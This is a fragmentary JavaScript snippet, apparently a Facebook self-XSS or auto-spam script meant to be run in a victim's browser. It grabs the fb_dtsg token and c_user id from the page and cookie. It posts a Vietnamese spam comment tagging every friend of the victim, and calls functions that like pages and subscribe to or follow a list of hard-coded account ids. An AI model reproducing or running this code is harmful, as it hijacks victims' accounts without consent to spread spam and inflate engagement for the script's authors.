...
mesaj += " 💋💏💐💑💓💔💖 Hay Quá mình Đã Làm Đc rồi nèk mọi người ơi ⚡ ☔ ✨ ❤  @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
...
function yorum_yap(id ,mesaj) {
 ...
 params +="&source=2";
 params +="&client_id= 208219489371993";
 params +="&reply_fbid";
...
sublist("1466307723599150");
IDS("100006598089918");
sublist("1411713365725253");
sublist("1412661235630466");
Like("207819696084679");
sublist("1466309343598988");
sublist("1466309213599001");
sublist("1466309160265673");
sublist("1466309130265676");
sublist("1466309073599015");
sublist("1466309040265685");
a("100004803427158");
//Trung Hồ
a("100007466913100");
a("100006205567913");
sublist("1418706235012882");
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
